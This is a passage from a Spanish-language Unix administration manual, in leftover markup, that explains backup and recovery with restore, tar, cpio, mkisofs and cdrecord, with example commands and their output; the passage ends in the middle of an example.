 align="center"><para>        </para></entry>
 </row></tbody></tgroup></informaltable>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-1040033"  ></anchor>Cuadro&#x00A0;7.3</title><para>Opciones de la orden restore</para></blockquote>
</section>
<!--l. 480--><para>  Por ejemplo, imaginemos que deseamos restaurar varios archivos de un backup guardado en el &#xFB01;chero
&#x2018;backup&#x2019;; en primer lugar podemos consultar el contenido de la cinta con una orden como la siguiente (en
Linux):

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;restore&#x00A0;-t&#x00A0;-f&#x00A0;backup&#x003E;contenido
&#x00A0;Level&#x00A0;0&#x00A0;dump&#x00A0;of&#x00A0;/home&#x00A0;on&#x00A0;luisa:/dev/hda3
&#x00A0;Label:&#x00A0;none
&#x00A0;luisa:~#&#x00A0;cat&#x00A0;contenido|more
&#x00A0;Dump&#x00A0;&#x00A0;&#x00A0;date:&#x00A0;Fri&#x00A0;Jun&#x00A0;23&#x00A0;06:01:26&#x00A0;2000
&#x00A0;Dumped&#x00A0;from:&#x00A0;the&#x00A0;epoch
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;2&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;.
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;11&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./lost+found
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;30761&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./lost+found/#30761
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;30762&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./lost+found/#30762
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;30763&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./lost+found/#30763
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;30764&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./lost+found/#30764
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;30765&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./lost+found/#30765
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;30766&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./lost+found/#30766
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;30767&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./lost+found/#30767
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;4097&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./ftp
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;8193&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./ftp/bin
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;8194&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./ftp/bin/compress
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;8195&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./ftp/bin/cpio
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;8196&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./ftp/bin/gzip
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;8197&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./ftp/bin/ls
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;8198&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./ftp/bin/sh
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;8199&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./ftp/bin/tar
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;8200&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./ftp/bin/zcat
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;12289&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./ftp/etc
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;12290&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;./ftp/etc/group
&#x00A0;Broken&#x00A0;pipe
&#x00A0;luisa:~#
</literallayout>
<!--l. 515--><para>Una vez que conocemos el contenido de la copia de seguridad &#x2013; y por tanto el nombre del archivo o archivos
a restaurar &#x2013; podemos extraer el &#xFB01;chero que nos interese con una orden como

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;restore&#x00A0;-x&#x00A0;-f&#x00A0;backup&#x00A0;./ftp/bin/tar
&#x00A0;You&#x00A0;have&#x00A0;not&#x00A0;read&#x00A0;any&#x00A0;tapes&#x00A0;yet.
&#x00A0;Unless&#x00A0;you&#x00A0;know&#x00A0;which&#x00A0;volume&#x00A0;your&#x00A0;file(s)&#x00A0;are&#x00A0;on&#x00A0;you&#x00A0;should&#x00A0;start
&#x00A0;with&#x00A0;the&#x00A0;last&#x00A0;volume&#x00A0;and&#x00A0;work&#x00A0;towards&#x00A0;the&#x00A0;first.
&#x00A0;Specify&#x00A0;next&#x00A0;volume&#x00A0;#:&#x00A0;1
&#x00A0;set&#x00A0;owner/mode&#x00A0;for&#x00A0;&#x2019;.&#x2019;?&#x00A0;[yn]&#x00A0;n
&#x00A0;luisa:~#&#x00A0;ls&#x00A0;-l&#x00A0;ftp/bin/tar
&#x00A0;---x--x--x&#x00A0;&#x00A0;&#x00A0;1&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;110668&#x00A0;Mar&#x00A0;21&#x00A0;&#x00A0;1999&#x00A0;ftp/bin/tar
&#x00A0;luisa:~#
</literallayout>
<!--l. 531--><para>Como podemos ver, la extracci&#x00F3;n se ha realizado a partir del directorio de trabajo actual; si quisi&#x00E9;ramos
extraer archivos en su ubicaci&#x00F3;n original deber&#x02CA;&#x0131;amos hacerlo desde el directorio adecuado, o, en algunas
versiones de restore, especi&#xFB01;car dicho directorio en la l&#x02CA;&#x0131;nea de &#x00F3;rdenes.
<!--br/-->
<!--br/-->Una opci&#x00F3;n muy interesante ofrecida por restore es la posibilidad de trabajar en modo interactivo,
mediante la opci&#x00F3;n &#x2018;i&#x2019;; en este modo, al usuario se le ofrece un prompt desde el cual puede, por ejemplo,
listar el contenido de una cinta, cambiar de directorio de trabajo o extraer archivos. El siguiente ejemplo
(tambi&#x00E9;n sobre Linux) ilustra esta opci&#x00F3;n:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;restore&#x00A0;-i&#x00A0;-f&#x00A0;backup
&#x00A0;restore&#x00A0;&#x003E;&#x00A0;help
&#x00A0;Available&#x00A0;commands&#x00A0;are:
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ls&#x00A0;[arg]&#x00A0;-&#x00A0;list&#x00A0;directory
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;cd&#x00A0;arg&#x00A0;-&#x00A0;change&#x00A0;directory
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;pwd&#x00A0;-&#x00A0;print&#x00A0;current&#x00A0;directory
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;add&#x00A0;[arg]&#x00A0;-&#x00A0;add&#x00A0;&#x2018;arg&#x2019;&#x00A0;to&#x00A0;list&#x00A0;of&#x00A0;files&#x00A0;to&#x00A0;be&#x00A0;extracted
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;delete&#x00A0;[arg]&#x00A0;-&#x00A0;delete&#x00A0;&#x2018;arg&#x2019;&#x00A0;from&#x00A0;list&#x00A0;of&#x00A0;files&#x00A0;to&#x00A0;be&#x00A0;extracted
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;extract&#x00A0;-&#x00A0;extract&#x00A0;requested&#x00A0;files
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;setmodes&#x00A0;-&#x00A0;set&#x00A0;modes&#x00A0;of&#x00A0;requested&#x00A0;directories
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;quit&#x00A0;-&#x00A0;immediately&#x00A0;exit&#x00A0;program
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;what&#x00A0;-&#x00A0;list&#x00A0;dump&#x00A0;header&#x00A0;information
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;verbose&#x00A0;-&#x00A0;toggle&#x00A0;verbose&#x00A0;flag&#x00A0;(useful&#x00A0;with&#x00A0;&#x2018;&#x2018;ls&#x2019;&#x2019;)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;help&#x00A0;or&#x00A0;&#x2018;?&#x2019;&#x00A0;-&#x00A0;print&#x00A0;this&#x00A0;list
&#x00A0;If&#x00A0;no&#x00A0;&#x2018;arg&#x2019;&#x00A0;is&#x00A0;supplied,&#x00A0;the&#x00A0;current&#x00A0;directory&#x00A0;is&#x00A0;used
&#x00A0;restore&#x00A0;&#x003E;&#x00A0;ls
&#x00A0;.:
&#x00A0;ftp/&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;httpd/&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;httpsd/&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;lost+found/&#x00A0;samba/&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;toni/
&#x00A0;
&#x00A0;restore&#x00A0;&#x003E;&#x00A0;add&#x00A0;httpd
&#x00A0;restore&#x00A0;&#x003E;&#x00A0;extract
&#x00A0;You&#x00A0;have&#x00A0;not&#x00A0;read&#x00A0;any&#x00A0;tapes&#x00A0;yet.
&#x00A0;Unless&#x00A0;you&#x00A0;know&#x00A0;which&#x00A0;volume&#x00A0;your&#x00A0;file(s)&#x00A0;are&#x00A0;on&#x00A0;you&#x00A0;should&#x00A0;start
&#x00A0;with&#x00A0;the&#x00A0;last&#x00A0;volume&#x00A0;and&#x00A0;work&#x00A0;towards&#x00A0;the&#x00A0;first.
&#x00A0;Specify&#x00A0;next&#x00A0;volume&#x00A0;#:&#x00A0;1
&#x00A0;set&#x00A0;owner/mode&#x00A0;for&#x00A0;&#x2019;.&#x2019;?&#x00A0;[yn]&#x00A0;n
&#x00A0;restore&#x00A0;&#x003E;&#x00A0;quit
&#x00A0;luisa:~#
</literallayout>
<!--l. 572--><para>Como podemos ver, hemos consultado el contenido de la copia de seguridad, a~nadido el directorio httpd/ a
la lista de &#xFB01;cheros a extraer (inicialmente vacia), y extra&#x02CA;&#x0131;do dicho directorio a partir del actual. Este uso
de restore proporciona una gran comodidad y facilidad de uso, ya que las &#x00F3;rdenes en modo interactivo son
muy sencillas.
  </para></section><!--end subsection--><!--l. 577--><section 
role="subsection"><title><abbrev role="title-mark">7.3.2</abbrev><anchor 
   id="x1-1050007.3.2"  ></anchor>La orden tar</title>
<!--l. 578--><para>  La utilidad tar (Tape Archiver) es una herramienta de f&#x00E1;cil manejo disponible en todas las versiones de
Unix que permite volcar &#xFB01;cheros individuales o directorios completos en un &#x00FA;nico &#xFB01;chero; inicialmente fu&#x00E9;
dise~nada para crear archivos de cinta (esto es, para transferir archivos de un disco a una cinta magn&#x00E9;tica y
viceversa), aunque en la actualidad casi todas sus versiones pueden utilizarse para copiar a cualquier
dipositivo o &#xFB01;chero, denominado &#x2018;contenedor&#x2019;. Su principal desventaja es que, bajo ciertas
condiciones, si falla una porci&#x00F3;n del medio (por ejemplo, una cinta) se puede perder toda la copia de
seguridad; adem&#x00E1;s, tar no es capaz de realizar por s&#x02CA;&#x0131; mismo m&#x00E1;s que copias de seguridad completas,
por lo que hace falta un poco de programaci&#x00F3;n shellscripts para realizar copias progresivas o
diferenciales.
<!--br/-->
<!--br/-->En la tabla  <ulink 
  url="#x1-1050014"  ><!--ref: tarops--></ulink> se muestran las opciones de tar m&#x00E1;s habituales; algunas de ellas no est&#x00E1;n disponibles en todas
las versiones de tar, por lo que es recomendable consultar la p&#x00E1;gina del manual de esta orden antes de
utilizarla. Si la implementaci&#x00F3;n de tar que existe en nuestro sistema no se ajusta a nuestras necesidades,
siempre podemos utilizar la versi&#x00F3;n de GNU (http://www.gnu.org/), quiz&#x00E1;s la m&#x00E1;s completa hoy en
d&#x02CA;&#x0131;a.


</para><section role="center"><title/>
<!--l. 599--><para> </para><table ><informaltable><tgroup cols="2"><tbody><row><entry 
 align="center"><para>Opci&#x00F3;n</para></entry><entry 
 align="center"><para>                  Acci&#x00F3;n realizada                             </para></entry>
 </row><row><entry 
 align="center"><para>   c   </para></entry><entry 
 align="center"><para>                 Crea un contenedor                          </para></entry>
 </row><row><entry 
 align="center"><para>   x   </para></entry><entry 
 align="center"><para>           Extrae archivos de un contenedor                 </para></entry>
 </row><row><entry 
 align="center"><para>   t   </para></entry><entry 
 align="center"><para>    Testea los archivos almacenados en un contenedor      </para></entry>
 </row><row><entry 
 align="center"><para>   r   </para></entry><entry 
 align="center"><para>        A~nade archivos al &#xFB01;nal de un contenedor            </para></entry>
 </row><row><entry 
 align="center"><para>   v   </para></entry><entry 
 align="center"><para>                   Modo verbose                            </para></entry>
 </row><row><entry 
 align="center"><para>   f    </para></entry><entry 
 align="center"><para>          Especi&#xFB01;ca el nombre del contenedor                </para></entry>
 </row><row><entry 
 align="center"><para>   Z   </para></entry><entry 
 align="center"><para>Comprime o descomprime mediante compress/uncompress</para></entry>
 </row><row><entry 
 align="center"><para>  z   </para></entry><entry 
 align="center"><para>        Comprime o descomprime mediante gzip       </para></entry>
 </row><row><entry 
 align="center"><para>  p   </para></entry><entry 
 align="center"><para>         Conserva los permisos de los &#xFB01;cheros               </para></entry>
 </row><row><entry 
 align="center"><para>        </para></entry>
 </row></tbody></tgroup></informaltable>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-1050014"  ></anchor>Cuadro&#x00A0;7.4</title><para>Opciones de la orden tar</para></blockquote>
</section>

<!--l. 627--><para>  En primer lugar debemos saber c&#x00F3;mo crear contenedores con los archivos deseados; por ejemplo,
imaginemos que deseamos volcar todo el directorio /export/home/ a la unidad de cinta /dev/rmt/0. Esto
lo conseguimos con la siguiente orden:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;tar&#x00A0;cvf&#x00A0;/dev/rmt/0&#x00A0;/export/home/
</literallayout>
<!--l. 636--><para>Como podemos ver, estamos especi&#xFB01;cando juntas las diferentes opciones necesarias para hacer la copia de
seguridad de los directorios de usuario; la opci&#x00F3;n &#x2018;v&#x2019; no ser&#x02CA;&#x0131;a necesaria, pero es &#x00FA;til para ver un listado de lo
que estamos almacenando en la cinta. En muchas situaciones tambi&#x00E9;n resulta &#x00FA;til comprimir la
informaci&#x00F3;n guardada (tar no comprime, s&#x00F3;lo empaqueta); esto lo conseguir&#x02CA;&#x0131;amos con las opciones
&#x2018;cvzf&#x2019;.
<!--br/-->
<!--br/-->Si en lugar de (o aparte de) un &#x00FA;nico directorio con todos sus &#xFB01;cheros y subdirectorios quisi&#x00E9;ramos
especi&#xFB01;car m&#x00FA;ltiples archivos (o directorios), podemos indic&#x00E1;rselos uno a uno a tar en la l&#x02CA;&#x0131;nea de comandos;
as&#x02CA;&#x0131; mismo, podemos indicar un nombre de archivo contenedor en lugar de un dispositivo. Por
ejemplo, la siguiente orden crear&#x00E1; el &#xFB01;chero /tmp/backup.tar, que contendr&#x00E1; /etc/passwd y
/etc/hosts*:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;tar&#x00A0;cvf&#x00A0;/tmp/backup.tar&#x00A0;/etc/passwd&#x00A0;/etc/hosts*
&#x00A0;tar:&#x00A0;Removing&#x00A0;leading&#x00A0;&#x2018;/&#x2019;&#x00A0;from&#x00A0;absolute&#x00A0;path&#x00A0;names&#x00A0;in&#x00A0;the&#x00A0;archive
&#x00A0;etc/passwd
&#x00A0;etc/hosts
&#x00A0;etc/hosts.allow
&#x00A0;etc/hosts.deny
&#x00A0;etc/hosts.equiv
&#x00A0;anita:~#
</literallayout>
<!--l. 661--><para>Una vez creado el contenedor podemos testear su contenido con la opci&#x00F3;n &#x2018;t&#x2019; para comprobar la integridad
del archivo, y tambi&#x00E9;n para ver qu&#x00E9; &#xFB01;cheros se encuentran en su interior:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;tar&#x00A0;tvf&#x00A0;/tmp/backup.tar
&#x00A0;-rw-r--r--&#x00A0;root/other&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;965&#x00A0;2000-03-11&#x00A0;03:41&#x00A0;etc/passwd
&#x00A0;-rw-r--r--&#x00A0;root/other&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;704&#x00A0;2000-03-14&#x00A0;00:56&#x00A0;etc/hosts
&#x00A0;-rw-r--r--&#x00A0;root/other&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;449&#x00A0;2000-02-17&#x00A0;01:48&#x00A0;etc/hosts.allow
&#x00A0;-rw-r--r--&#x00A0;root/other&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;305&#x00A0;1998-04-18&#x00A0;07:05&#x00A0;etc/hosts.deny
&#x00A0;-rw-r--r--&#x00A0;root/other&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;313&#x00A0;1994-03-16&#x00A0;03:30&#x00A0;etc/hosts.equiv
&#x00A0;-rw-r--r--&#x00A0;root/other&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;345&#x00A0;1999-10-13&#x00A0;03:31&#x00A0;etc/hosts.lpd
&#x00A0;anita:~#
</literallayout>
<!--l. 676--><para>Si lo que queremos es recuperar &#xFB01;cheros guardados en un contenedor utilizaremos las opciones &#x2018;xvf&#x2019; (o
&#x2018;xvzf&#x2019; si hemos utilizado compresi&#x00F3;n con gzip a la hora de crearlo). Podemos indicar el archivo o archivos
que queremos extraer; si no lo hacemos, se extraer&#x00E1;n todos:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;tar&#x00A0;xvf&#x00A0;/tmp/backup.tar&#x00A0;etc/passwd
&#x00A0;etc/passwd
&#x00A0;anita:~#&#x00A0;tar&#x00A0;xvf&#x00A0;/tmp/backup.tar
&#x00A0;etc/passwd
&#x00A0;etc/hosts
&#x00A0;etc/hosts.allow
&#x00A0;etc/hosts.deny
&#x00A0;etc/hosts.equiv
&#x00A0;etc/hosts.lpd
&#x00A0;anita:~#
</literallayout>
<!--l. 694--><para>La restauraci&#x00F3;n se habr&#x00E1; realizado desde el directorio de trabajo, creando en &#x00E9;l un subdirectorio etc con los
&#xFB01;cheros correspondientes en su interior. Si queremos que los &#xFB01;cheros del contenedor sobreescriban a los que
ya existen en el sistema hemos de desempaquetarlo en el directorio adecuado, en este caso el
ra&#x02CA;&#x0131;z.
  </para></section><!--end subsection--><!--l. 699--><section 
role="subsection"><title><abbrev role="title-mark">7.3.3</abbrev><anchor 
   id="x1-1060007.3.3"  ></anchor>La orden cpio</title>
<!--l. 700--><para>  cpio (Copy In/Out) es una utilidad que permite copiar archivos a o desde un contenedor cpio, que no es
m&#x00E1;s que un &#xFB01;chero que almacena otros archivos e informaci&#x00F3;n sobre ellos (permisos, nombres, propietario&#x2026;).
Este contenedor puede ser un disco, otro archivo, una cinta o incluso una tuber&#x02CA;&#x0131;a, mientras que los
&#xFB01;cheros a copiar pueden ser archivos normales, pero tambi&#x00E9;n dispositivos o sistemas de &#xFB01;cheros
completos.
<!--br/-->
<!--br/-->En la tabla  <ulink 
  url="#x1-1060015"  ><!--ref: cpioops--></ulink> se muestran las opciones de cpio m&#x00E1;s utilizadas; la sintaxis de esta orden es bastante m&#x00E1;s
confusa que la de tar debido a la interpretaci&#x00F3;n de lo que cpio entiende por &#x2018;dentro&#x2019; y &#x2018;fuera&#x2019;: copiar
&#x2018;fuera&#x2019; es generar un contenedor en salida est&#x00E1;ndar (que con toda probabilidad desearemos redireccionar),
mientras que copiar &#x2018;dentro&#x2019; es lo contrario, es decir, extraer archivos de la entrada est&#x00E1;ndar (tambi&#x00E9;n es
seguro que deberemos redireccionarla).
<!--br/-->


</para><section role="center"><title/>
<!--l. 715--><para> </para><table ><informaltable><tgroup cols="2"><tbody><row><entry 
 align="center"><para>Opci&#x00F3;n</para></entry><entry 
 align="center"><para>           Acci&#x00F3;n realizada                 </para></entry>
 </row><row><entry 
 align="center"><para>   o   </para></entry><entry 
 align="center"><para>         Copiar &#x2018;fuera&#x2019; (out)              </para></entry>
 </row><row><entry 
 align="center"><para>    i    </para></entry><entry 
 align="center"><para>         Copiar &#x2018;dentro&#x2019; (in)              </para></entry>
 </row><row><entry 
 align="center"><para>   m   </para></entry><entry 
 align="center"><para>  Conserva fecha y hora de los &#xFB01;cheros   </para></entry>
 </row><row><entry 
 align="center"><para>   t   </para></entry><entry 
 align="center"><para>       Crea tabla de contenidos           </para></entry>
 </row><row><entry 
 align="center"><para>   A   </para></entry><entry 
 align="center"><para>A~nade &#xFB01;cheros a un contenedor existente</para></entry>
 </row><row><entry 
 align="center"><para>   v   </para></entry><entry 
 align="center"><para>           Modo verbose                 </para></entry>
 </row><row><entry 
 align="center"><para>       </para></entry>
 </row></tbody></tgroup></informaltable>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-1060015"  ></anchor>Cuadro&#x00A0;7.5</title><para>Opciones de la orden cpio.</para></blockquote>
</section>

<!--l. 737--><para>  Por ejemplo, si deseamos copiar los archivos de /export/home/ en el &#xFB01;chero contenedor
<!--br/-->/tmp/backup.cpio podemos utilizar la siguiente sintaxis:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;find&#x00A0;/export/home/&#x00A0;|cpio&#x00A0;-o&#x00A0;&#x003E;&#x00A0;/tmp/backup.cpio
</literallayout>
<!--l. 745--><para>Como podemos ver, cpio lee la entrada est&#x00E1;ndar esperando los nombres de &#xFB01;cheros a guardar, por lo que es
conveniente utilizarlo tras una tuber&#x02CA;&#x0131;a pas&#x00E1;ndole esos nombres de archivo. Adem&#x00E1;s, hemos de redirigir su
salida al nombre que queramos asignarle al contenedor, ya que de lo contrario se mostrar&#x02CA;&#x0131;a el resultado en
salida est&#x00E1;ndar (lo que evidentemente no es muy utilizado para realizar backups). Podemos &#xFB01;jarnos tambi&#x00E9;n
en que estamos usando la orden &#x2018;find&#x2019; en lugar de un simple &#x2018;ls&#x2019;: esto es debido a que
&#x2018;ls&#x2019; mostrar&#x02CA;&#x0131;a s&#x00F3;lo el nombre de cada &#xFB01;chero (por ejemplo, &#x2018;passwd&#x2019;) en lugar de su ruta
completa (&#x2018;/etc/passwd&#x2019;), por lo que cpio buscar&#x02CA;&#x0131;a dichos &#xFB01;cheros a partir del directorio
actual.
<!--br/-->
<!--br/-->Una vez creado el &#xFB01;chero contenedor quiz&#x00E1;s resulte interesante chequear su contenido, con la opci&#x00F3;n &#x2018;t&#x2019;. Por
ejemplo, la siguiente orden mostrar&#x00E1; en pantalla el contenido de /tmp/backup.cpio:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;cpio&#x00A0;-t&#x00A0;&#x003C;&#x00A0;/tmp/backup.cpio
</literallayout>
<!--l. 764--><para>Igual que para almacenar &#xFB01;cheros en un contenedor hemos de pasarle a cpio la ruta de los mismos, para
extraerlos hemos de hacer lo mismo; si no indicamos lo contrario, cpio -i extraer&#x00E1; todos los archivos de un
contenedor, pero si s&#x00F3;lo nos interesan algunos de ellos podemos especi&#xFB01;car su nombre de la siguiente
forma:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;echo&#x00A0;&#x0022;/export/home/toni/hola.tex&#x0022;&#x00A0;|cpio&#x00A0;-i&#x00A0;&#x003C;/tmp/backup.cpio
</literallayout>
<!--l. 774--><para>Para conocer m&#x00E1;s profundamente el funcionamiento de cpio, as&#x02CA;&#x0131; como opciones propias de cada
implementaci&#x00F3;n, es indispensable consultar la p&#x00E1;gina del manual de esta orden en cada clon de Unix donde
vayamos a utilizarla.
  </para></section><!--end subsection--><!--l. 778--><section 
role="subsection"><title><abbrev role="title-mark">7.3.4</abbrev><anchor 
   id="x1-1070007.3.4"  ></anchor>Backups sobre CD-ROM</title>
<!--l. 780--><para>  Como antes hemos dicho, cada vez es m&#x00E1;s com&#x00FA;n que se realicen copias de seguridad sobre discos
compactos; en estos casos no se suelen utilizar las aplicaciones vistas hasta ahora (tar o cpio), sino que se
necesita un software dedicado: aqu&#x02CA;&#x0131; vamos a comentar las nociones m&#x00E1;s b&#x00E1;sicas para poder crear backups
sobre este medio. Para poder grabar una copia de seguridad en un CD-ROM necesitamos en primer lugar
que el n&#x00FA;cleo del sistema operativo reconozca nuestra grabadora como tal; si se trata de una IDE, y
dependiendo del clon de Unix utilizado, quiz&#x00E1;s sea necesario modi&#xFB01;car el kernel, ya que el acceso que los
diferentes programas realizan al dispositivo se efectua a trav&#x00E9;s de un interfaz SCSI del n&#x00FA;cleo. Es
necesario consultar la documentaci&#x00F3;n y la lista de compatibilidad hardware para cada Unix
particular.
<!--br/-->
<!--br/-->Si asumimos que el reconocimiento del dispositivo es correcto, lo que necesitamos a continuaci&#x00F3;n es software
capaz de grabar un CD-ROM. Por un lado es necesario un programa para crear im&#x00E1;genes ISO, el &#x2018;molde&#x2019; de
lo que ser&#x00E1; el futuro CD-ROM; el m&#x00E1;s conocido es sin duda mkisofs. Adem&#x00E1;s necesitaremos un
programa para realizar lo que es la grabaci&#x00F3;n en s&#x02CA;&#x0131;, como cdrecord. De esta forma lo primero que
generaremos es una imagen de los &#xFB01;cheros a grabar, imagen que a continuaci&#x00F3;n pasaremos
al CD-ROM; por ejemplo, si queremos hacer un backup de /export/home/, en primer lugar
utilizaremos mkisofs para crear una imagen con todos los &#xFB01;cheros y subdirectorios de los
usuarios:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;mkisofs&#x00A0;-a&#x00A0;-R&#x00A0;-l&#x00A0;-o&#x00A0;/mnt/imagen.iso&#x00A0;/export/home/
</literallayout>
<!--l. 808--><para>Con esta orden hemos creado una imagen ISO denominada /mnt/imagen.iso y que contiene toda la
estructura de directorios por debajo de /export/home/; con las diferentes opciones hemos indicado que se
almacenen todos los &#xFB01;cheros, que se sigan los enlaces simb&#x00F3;licos y que se registre adem&#x00E1;s informaci&#x00F3;n sobre los
permisos de cada archivo. Una vez que tenemos esta imagen (que en los Unices con soporte para sistemas
de &#xFB01;cheros loop podremos montar como si se tratara de una partici&#x00F3;n, para a~nadir, borrar,
modi&#xFB01;car&#x2026;&#xFB01;cheros antes de la grabaci&#x00F3;n) hemos de pasarla a un CD-ROM, por ejemplo mediante
cdrecord:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;cdrecord&#x00A0;dev=0,1,0&#x00A0;fs=16m&#x00A0;/mnt/imagen.iso
</literallayout>
<!--l. 822--><para>Con esta orden le hemos indicado al sistema la ubicaci&#x00F3;n de nuestra grabadora, as&#x02CA;&#x0131; como un bu&#xFB00;er de
grabaci&#x00F3;n de 16MB y tambi&#x00E9;n la ubicaci&#x00F3;n de la imagen ISO.
<!--br/-->
<!--br/-->Algo muy interesante es la posibilidad de grabar sin necesidad de crear primero im&#x00E1;genes con los &#xFB01;cheros
que queremos meter en un CD-ROM; esto nos ahorrar&#x00E1; tiempo (y sobre todo, espacio en disco) a la hora de
realizar copias de seguridad, adem&#x00E1;s de permitir una mayor automatizaci&#x00F3;n del proceso. Para ello, debemos
calcular con mkisofs el espacio que ocupan los &#xFB01;cheros a grabar (con la opci&#x00F3;n &#x2018;-print-size&#x2019;), y
posteriormente pasarle este valor a cdrecord; podemos hacerlo de forma autom&#x00E1;tica, por ejemplo tal y
como muestra el siguiente programa:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;cat&#x00A0;&#x2018;which&#x00A0;graba-cd&#x2018;
